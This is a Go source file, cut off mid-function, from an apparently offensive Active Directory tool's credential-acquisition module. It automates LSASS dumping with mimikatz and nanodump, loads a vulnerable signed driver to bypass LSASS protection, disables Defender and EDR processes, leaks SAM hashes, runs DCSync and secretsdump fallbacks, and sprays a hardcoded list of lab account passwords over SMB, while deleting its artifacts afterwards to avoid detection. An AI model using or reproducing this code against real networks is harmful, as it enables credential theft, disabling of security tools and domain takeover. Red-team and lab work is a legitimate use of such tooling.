package modules

import (
	"adpack/core"
	"adpack/tools"
	"adpack/utils"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode"
)

var acquisitionPipelines = map[string]PipelineDef{
	"minimal": {
		Name:        "minimal",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz and execute via NetExec SMB on target",
	},
	"standard": {
		Name:        "standard",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Donut-wrap go-mimikatz, upload via SMB, execute via WMI/WinRM, retrieve output",
	},
	"aggressive": {
		Name:        "aggressive",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump via SMB, execute with --fork, retrieve and parse dump",
	},
	"bof": {
		Name:        "bof",
		Delivery:    "bof",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "BOF-based nanodump via C2 agent (requires active agent on target)",
	},
	"fork": {
		Name:        "fork",
		Delivery:    "exe",
		PayloadType: "nanodump",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload nanodump.exe via SMB, execute with --fork (clone LSASS), retrieve dump",
	},
	"byovd": {
		Name:        "byovd",
		Delivery:    "exe",
		PayloadType: "byovd",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload RTCore64.sys + dump tool via SMB, load driver, patch LSASS PPL, dump",
	},
	"coldwer": {
		Name:        "coldwer",
		Delivery:    "exe",
		PayloadType: "coldwer",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload EDR-Freeze.exe + nanodump.exe via SMB, freeze EDR for 3s, dump LSASS",
	},
	"undefend": {
		Name:        "undefend",
		Delivery:    "exe",
		PayloadType: "undefend",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload UnDefend.exe + nanodump.exe, kill Defender, fork dump LSASS",
	},
	"bluehammer": {
		Name:        "bluehammer",
		Delivery:    "exe",
		PayloadType: "bluehammer",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Upload FunnyApp.exe, exploit Defender RPC to leak SAM via VSS, extract hashes",
	},
	"phantomkiller": {
		Name:        "phantomkiller",
		Delivery:    "exe",
		PayloadType: "phantomkiller",
		RemoteExec:  true,
		ParseFn:     parseNanodumpOutput,
		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
	},
	"miniplasma": {
		Name:        "miniplasma",
		Delivery:    "exe",
		PayloadType: "miniplasma",
		RemoteExec:  true,
		ParseFn:     parseMimikatzOutput,
		Description: "Upload MiniPlasma.exe, exploit Cloud Filter API race condition for SYSTEM shell, dump LSASS",
	},
	"dcsync": {
		Name:        "dcsync",
		Delivery:    "donut",
		PayloadType: "go-mimikatz",
		RemoteExec:  false,
		ParseFn:     parseMimikatzOutput,
		Description: "DCSync via go-mimikatz sekurlsa::dcsync for each DA credential",
	},
}

type PipelineDef struct {
	Name        string
	Delivery    string
	PayloadType string
	RemoteExec  bool
	ParseFn     func(string) []core.Credential
	Description string
}

var weakPasswordSpray = []struct {
	Username string
	Password string
}{
	{"hodor", "hodor"},
	{"robb.stark", "sexywolfy"},
	{"eddard.stark", "FightP3aceAndHonor!"},
	{"catelyn.stark", "robbsansabradonaryarickon"},
	{"arya.stark", "Needle"},
	{"rickon.stark", "Winter2022"},
	{"jon.snow", "iknownothing"},
	{"sansa.stark", "345ertdfg"},
	{"brandon.stark", "iseedeadpeople"},
	{"tywin.lannister", "powerkingftw135"},
	{"jaime.lannister", "cersei"},
	{"tyron.lannister", "Alc00L&S3x"},
	{"joffrey.baratheon", "1killerlion"},
	{"robert.baratheon", "iamthekingoftheworld"},
	{"cersei.lannister", "il0vejaime"},
	{"stannis.baratheon", "Drag0nst0ne"},
	{"petyer.baelish", "@littlefinger@"},
	{"lord.varys", "_W1sper_$"},
	{"maester.pycelle", "MaesterOfMaesters"},
}

func runPasswordSpray(state *core.ADState, domain string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if domain == "" {
		return result
	}
	fmt.Println("[*] Password spraying known weak credentials...")

	existing := make(map[string]bool)
	for _, c := range state.Creds {
		existing[c.Domain+"\\"+c.Username] = true
	}

	sprayDelay := 500 * time.Millisecond
	failThreshold := 3
	accountFails := make(map[string]int)

	for _, host := range state.Hosts {
		if host.IP == "" {
			continue
		}
		for _, wp := range weakPasswordSpray {
			key := domain + "\\" + wp.Username
			if existing[key] {
				continue
			}
			if accountFails[key] >= failThreshold {
				continue
			}
			time.Sleep(sprayDelay)
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", domain,
				"-u", wp.Username,
				"-p", wp.Password)
			if cr.ExitCode != 0 {
				accountFails[key]++
				continue
			}
			if strings.Contains(cr.Stdout, "[+]") {
				fmt.Printf("[+] Spray: %s\\%s:%s valid on %s\n",
					domain, wp.Username, wp.Password, host.IP)
				cred := core.Credential{
					Type:      core.CredPlaintext,
					Username:  wp.Username,
					Domain:    domain,
					Secret:    wp.Password,
					Source:    "password_spray",
					Validated: true,
				}
				result.Creds = append(result.Creds, cred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "password_spray", Key: key,
					Value: wp.Password, Confidence: 1.0, Timestamp: time.Now(),
				})
				break
			}
			accountFails[key]++
		}
	}

	// Username=password spray for each enumerated user
	fmt.Println("[*] Trying username=password combinations...")
	for _, u := range state.Users {
		key := domain + "\\" + u.Username
		if existing[key] {
			continue
		}
		for _, host := range state.Hosts {
			if host.IP == "" {
				continue
			}
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", domain,
				"-u", u.Username,
				"-p", u.Username)
			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
				fmt.Printf("[+] Username=Password: %s\\%s valid on %s\n",
					domain, u.Username, host.IP)
				cred := core.Credential{
					Type: core.CredPlaintext, Username: u.Username,
					Domain: domain, Secret: u.Username,
					Source: "username_spray", Validated: true,
				}
				result.Creds = append(result.Creds, cred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "username_spray", Key: key,
					Value: u.Username, Confidence: 1.0, Timestamp: time.Now(),
				})
				break
			}
		}
	}

	// Cross-domain password reuse: try known credentials against other domains
	fmt.Println("[*] Testing cross-domain password reuse...")
	for _, cred := range state.Creds {
		if cred.Secret == "" || cred.Username == "" {
			continue
		}
		for _, host := range state.Hosts {
			if host.IP == "" || host.Domain == cred.Domain {
				continue
			}
			key := host.Domain + "\\" + cred.Username
			if existing[key] {
				continue
			}
			cr := utils.RunCommand("nxc", "smb", host.IP,
				"-d", host.Domain,
				"-u", cred.Username,
				"-p", cred.Secret)
			if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "[+]") {
				fmt.Printf("[+] Cross-domain reuse: %s\\%s valid on %s (%s)\n",
					host.Domain, cred.Username, host.IP, host.Domain)
				newCred := core.Credential{
					Type: core.CredPlaintext, Username: cred.Username,
					Domain: host.Domain, Secret: cred.Secret,
					Source: "cross_domain_reuse", Validated: true,
				}
				result.Creds = append(result.Creds, newCred)
				existing[key] = true
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "cross_domain_reuse", Key: key,
					Value: cred.Secret, Confidence: 0.9, Timestamp: time.Now(),
				})
			}
		}
	}

	if len(result.Creds) > 0 {
		fmt.Printf("[+] Spray: %d credential(s) found\n", len(result.Creds))
	} else {
		fmt.Println("[i] Spray: no weak credentials found")
	}
	return result
}

func RunCredentialAcq(state *core.ADState, profileName string, targetHost string) *core.ToolResult {
	profile, ok := LookupProfile(profileName)
	if !ok {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "evasion", Key: "error",
				Value: fmt.Sprintf("unknown profile: %s", profileName),
			}},
		}
	}

	pipeline, ok := acquisitionPipelines[profileName]
	if !ok {
		pipeline = acquisitionPipelines["standard"]
	}

	fmt.Printf("[*] Using evasion profile: %s (%s)\n", profile.Name, profile.Description)

	host, found := selectTarget(state, targetHost)
	if !found {
		return &core.ToolResult{
			Success: false,
			Evidence: []core.EvidenceEntry{{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "credential_acq", Key: "target", Value: "none",
				Confidence: 0, Timestamp: time.Now(),
			}},
		}
	}

	fmt.Printf("[*] Target: %s (%s)\n", host.IP, host.Hostname)

	domain, user, pass, hash := getCredential(state)
	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)

	var result *core.ToolResult
	switch profileName {
	case "minimal":
		result = executeMimikatzPipeline(state, host, pipeline, exec)
	case "standard":
		result = executeMimikatzPipeline(state, host, pipeline, exec)
	case "aggressive", "bof", "fork":
		result = executeNanodumpPipeline(state, host, pipeline, exec)
	case "byovd":
		result = executeBYOVDPipeline(state, host, pipeline, exec)
	case "coldwer":
		result = executeColdWerPipeline(state, host, pipeline, exec)
	case "undefend":
		result = executeUnDefendPipeline(state, host, pipeline, exec)
	case "bluehammer":
		result = executeBlueHammerPipeline(state, host, pipeline, exec)
	case "phantomkiller":
		result = executePhantomKillerPipeline(state, host, pipeline, exec)
	case "miniplasma":
		result = executeMiniPlasmaPipeline(state, host, pipeline, exec)
	case "dcsync":
		result = executeDCSyncPipeline(state, host, pipeline, exec)
	default:
		result = executeMimikatzPipeline(state, host, pipeline, exec)
	}

	// Fallback: primary pipeline failed; try impacket-secretsdump DCSync
	if !result.Success && len(result.Evidence) > 0 && !strings.Contains(result.Evidence[0].Value, "secretsdump") {
		fmt.Println("[*] Primary pipeline failed, trying DCSync via impacket-secretsdump...")
		// Target a DC for DCSync, not the original host (which may be a member server)
		dcHost := host
		if dc := findDC(state, domain); dc.IP != "" {
			dcHost = dc
		}
		fallback := executeSecretsdumpPipeline(state, dcHost)
		if fallback.Success {
			return fallback
		}
	}

	// Supplementary: password spraying (always runs, finds weak/default creds)
	sprayResult := runPasswordSpray(state, domain)
	result.Creds = append(result.Creds, sprayResult.Creds...)
	result.Evidence = append(result.Evidence, sprayResult.Evidence...)

	// Fallback: try SAM dump via nxc
	if !result.Success {
		fmt.Println("[*] Trying SAM dump via nxc...")
		samResult := executeSAMDump(state, host)
		if samResult.Success {
			return samResult
		}
	}

	return result
}

func selectTarget(state *core.ADState, preferred string) (core.Host, bool) {
	if preferred != "" {
		for _, h := range state.Hosts {
			if h.IP == preferred || h.Hostname == preferred {
				return h, true
			}
		}
	}
	if len(state.Hosts) > 0 {
		for _, h := range state.Hosts {
			if h.IsDC {
				return h, true
			}
		}
		return state.Hosts[0], true
	}
	return core.Host{}, false
}

func getCredential(state *core.ADState) (string, string, string, string) {
	for _, c := range state.Creds {
		if c.Validated && c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	for _, c := range state.Creds {
		if c.Domain != "" && c.Username != "" {
			return c.Domain, c.Username, c.Secret, c.Hash
		}
	}
	return "", "", "", ""
}

func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, _, pass, _ := getCredential(state)

	if !tools.GoMimikatz.Available() {
		// Fall back to nanodump if go-mimikatz is not installed
		if tools.Nanodump.Available() {
			fmt.Println("[*] go-mimikatz not available, falling back to nanodump pipeline...")
			return executeNanodumpPipeline(state, host, pipeline, exec)
		}
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "go-mimikatz", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	mcfg := tools.DefaultGoMimikatzConfig()

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote exec go-mimikatz on %s via NetExec...\n", host.IP)
		safeCmd := sanitizeMimikatzCommand(mcfg.Command)
		r := exec.Execute(ctx, core.Action{
			Artifact: fmt.Sprintf("go-mimikatz %s", safeCmd),
			Method:   "command", Timeout: 60 * time.Second,
		})
		if r.Success {
			creds := pipeline.ParseFn(r.Output)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.7, RawOutput: r.Output,
					Timestamp: time.Now(),
				})
			}
		} else {
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "go-mimikatz", Key: "error",
				Value:     "remote execution failed",
				Timestamp: time.Now(),
			})
		}
		return result
	}

	fmt.Println("[*] Running go-mimikatz locally...")
	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
	if err != nil || r == nil || !r.Success {
		result.Success = false
		if r != nil {
			result.RawOutput = r.Stdout
		}
		return result
	}

	result.Success = true
	creds := pipeline.ParseFn(r.Stdout)
	result.Creds = append(result.Creds, creds...)
	for _, c := range creds {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
			Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
			Timestamp: time.Now(),
		})
	}
	result.RawOutput = r.Stdout
	return result
}

func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, _, pass, _ := getCredential(state)

	if !tools.Nanodump.Available() {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nanodump", Key: "status", Value: "tool not available",
		})
		result.Success = false
		return result
	}

	ncfg := tools.NanodumpConfig{
		Output: fmt.Sprintf("/tmp/lsass_%d.dmp", time.Now().Unix()),
	}

	ctx := context.Background()

	if pipeline.RemoteExec && domain != "" && pass != "" {
		fmt.Printf("[*] Remote nanodump on %s via NetExec SMB...\n", host.IP)

		remotePath := fmt.Sprintf(`C:\Windows\Temp\lsass_%d.dmp`, time.Now().Unix())
		ncfg.Output = remotePath

		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
		r := exec.Execute(ctx, core.Action{
			Artifact: cmd, Method: "command", Timeout: 90 * time.Second,
		})
		if !r.Success {
			errMsg := r.Error
			if errMsg == "" {
				errMsg = r.Stderr
			}
			fmt.Printf("[!] Remote execution failed: %s\n", errMsg)
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "nanodump", Key: "error",
				Value:     "remote execution failed: " + errMsg,
				Timestamp: time.Now(),
			})
			return result
		}

		fmt.Println("[*] Retrieving dump via SMB...")
		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
		getR := exec.Execute(ctx, core.Action{
			Artifact: remotePath, Method: "get",
			Arguments: []string{localPath}, Timeout: 60 * time.Second,
		})
		if getR.Success {
			fmt.Printf("[*] Parsing dump with pypykatz...\n")
			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
			if err != nil {
				pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localPath)
				if pyr.Success {
					creds := pipeline.ParseFn(pyr.Stdout)
					result.Creds = append(result.Creds, creds...)
				}
			} else if parsed.Success {
				creds := pipeline.ParseFn(parsed.Stdout)
				result.Creds = append(result.Creds, creds...)
			}
		}
		return result
	}

	fmt.Println("[*] Running nanodump locally...")
	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
		Evasion: "fork",
	})
	if err != nil || r == nil || !r.Success {
		result.Success = false
		if r != nil {
			result.RawOutput = r.Stdout
		}
		return result
	}

	parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
	if err != nil || !parsed.Success {
		result.Success = false
		result.RawOutput = r.Stdout
		return result
	}

	result.Success = true
	creds := pipeline.ParseFn(parsed.Stdout)
	result.Creds = append(result.Creds, creds...)
	result.RawOutput = r.Stdout
	return result
}

func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, _, pass, _ := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BYOVD pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	ctx := context.Background()

	fmt.Println("[*] BYOVD: Deploying RTCore64.sys (randomized name)...")
	drvR := exec.Execute(ctx, core.Action{
		Artifact: "RTCore64.sys", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !drvR.Success {
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "driver upload failed: " + drvR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	driverPath := drvR.Output

	fmt.Println("[*] BYOVD: Deploying nanodump.exe (randomized name)...")
	dmpR := exec.Execute(ctx, core.Action{
		Artifact: "nanodump.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !dmpR.Success {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{driverPath}, Timeout: 15 * time.Second,
		})
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "nanodump upload failed: " + dmpR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	dumperPath := dmpR.Output

	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_byovd_%d.dmp`, time.Now().UnixNano())

	defer func() {
		exec.Execute(ctx, core.Action{
			Artifact: `sc stop RTCore64`, Method: "command", Timeout: 15 * time.Second,
		})
		time.Sleep(1 * time.Second)
		exec.Execute(ctx, core.Action{
			Artifact: `sc delete RTCore64`, Method: "command", Timeout: 15 * time.Second,
		})
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{driverPath, dumperPath, dumpRemote},
			Timeout: 30 * time.Second,
		})
	}()

	fmt.Println("[*] BYOVD: Loading kernel driver...")
	loadCmd := fmt.Sprintf(`sc create RTCore64 binPath=%s type=kernel && sc start RTCore64`, driverPath)
	loadR := exec.Execute(ctx, core.Action{
		Artifact: loadCmd, Method: "command", Timeout: 30 * time.Second,
	})
	if !loadR.Success {
		fmt.Println("[!] Driver load failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "driver load failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Dumping LSASS via nanodump --fork...")
	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
	dumpR := exec.Execute(ctx, core.Action{
		Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
	})
	if !dumpR.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "byovd", Key: "error", Value: "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] BYOVD: Retrieving dump...")
	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_byovd_%d.dmp", time.Now().UnixNano()))
	getR := exec.Execute(ctx, core.Action{
		Artifact: dumpRemote, Method: "get",
		Arguments: []string{localDump}, Timeout: 60 * time.Second,
	})
	if getR.Success {
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "byovd", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}
	return result
}

func runDefenderKill(ctx context.Context, exec core.Executor, target tools.NetExecTarget) {
	if !tools.UnDefend.Available() {
		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
		return
	}

	fmt.Println("[*] Pre-condition: Deploying UnDefend.exe (randomized name)...")
	deployR := exec.Execute(ctx, core.Action{
		Artifact: "UnDefend.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !deployR.Success {
		fmt.Printf("[!] Failed to deploy UnDefend.exe: %v\n", deployR.Error)
		return
	}
	remotePath := deployR.Output

	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
	exec.Execute(ctx, core.Action{
		Artifact: remotePath, Method: "run",
		Arguments: []string{"--aggressive"}, Timeout: 30 * time.Second,
	})
	time.Sleep(2 * time.Second)

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
	})
}

func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for UnDefend pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	ctx := context.Background()
	runDefenderKill(ctx, exec, target)

	fmt.Println("[*] UnDefend: Deploying nanodump.exe (randomized name)...")
	dmpR := exec.Execute(ctx, core.Action{
		Artifact: "nanodump.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !dmpR.Success {
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value:     "nanodump upload failed: " + dmpR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	dumperPath := dmpR.Output
	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_undefend_%d.dmp`, time.Now().UnixNano())
	defer func() {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{dumperPath, dumpRemote},
			Timeout: 30 * time.Second,
		})
	}()

	fmt.Println("[*] UnDefend: Dumping LSASS via nanodump --fork...")
	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
	dmpR = exec.Execute(ctx, core.Action{
		Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
	})
	if !dmpR.Success {
		fmt.Println("[!] Dump failed")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "undefend", Key: "error",
			Value:     "dump failed",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] UnDefend: Retrieving dump...")
	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_undefend_%d.dmp", time.Now().UnixNano()))
	getR := exec.Execute(ctx, core.Action{
		Artifact: dumpRemote, Method: "get",
		Arguments: []string{localDump}, Timeout: 60 * time.Second,
	})
	if getR.Success {
		fmt.Println("[*] UnDefend: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "undefend", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}
	return result
}

func executeBlueHammerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for BlueHammer pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.BlueHammer.Available() {
		fmt.Println("[!] FunnyApp.exe (BlueHammer) not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	ctx := context.Background()
	fmt.Println("[*] BlueHammer: Deploying FunnyApp.exe (randomized name)...")
	deployR := exec.Execute(ctx, core.Action{
		Artifact: "FunnyApp.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !deployR.Success {
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "error",
			Value:     "deploy failed: " + deployR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	remotePath := deployR.Output
	defer func() {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
		})
	}()

	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit (start /B)...")
	execR, err := tools.BlueHammer.ExecRemote(ctx, target, remotePath)
	if err != nil || execR == nil || !execR.Success {
		result.Success = false
		errMsg := "execution failed"
		if err != nil {
			errMsg = err.Error()
		} else if execR != nil {
			errMsg = execR.Stderr
		}
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "bluehammer", Key: "sam_leak",
			Value:      "BlueHammer execution failed: " + errMsg,
			Confidence: 0.0, Timestamp: time.Now(),
		})
		return result
	}
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
		Source: "bluehammer", Key: "sam_leak",
		Value:      "BlueHammer executed. Check target for SAM output.",
		Confidence: 0.5, RawOutput: execR.Stdout,
		Timestamp: time.Now(),
	})
	return result
}

func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for ColdWer pipeline, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	ctx := context.Background()
	runDefenderKill(ctx, exec, target)

	fmt.Println("[*] ColdWer: Deploying EDR-Freeze.exe (randomized name)...")
	freezerR := exec.Execute(ctx, core.Action{
		Artifact: "EDR-Freeze.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !freezerR.Success {
		fmt.Printf("[!] Failed to deploy EDR-Freeze.exe — falling back to nanodump\n")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}
	freezerPath := freezerR.Output

	fmt.Println("[*] ColdWer: Deploying nanodump.exe (randomized name)...")
	dmpR := exec.Execute(ctx, core.Action{
		Artifact: "nanodump.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !dmpR.Success {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{freezerPath}, Timeout: 15 * time.Second,
		})
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "coldwer", Key: "error",
			Value:     "nanodump upload failed: " + dmpR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	dumperPath := dmpR.Output
	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_frozen_%d.dmp`, time.Now().UnixNano())
	defer func() {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{freezerPath, dumperPath, dumpRemote},
			Timeout: 30 * time.Second,
		})
	}()

	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
		"Cylance.exe", "Sophos.exe", "TaniumClient.exe", "S1.exe"}

	dumped := false
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR := exec.Execute(ctx, core.Action{
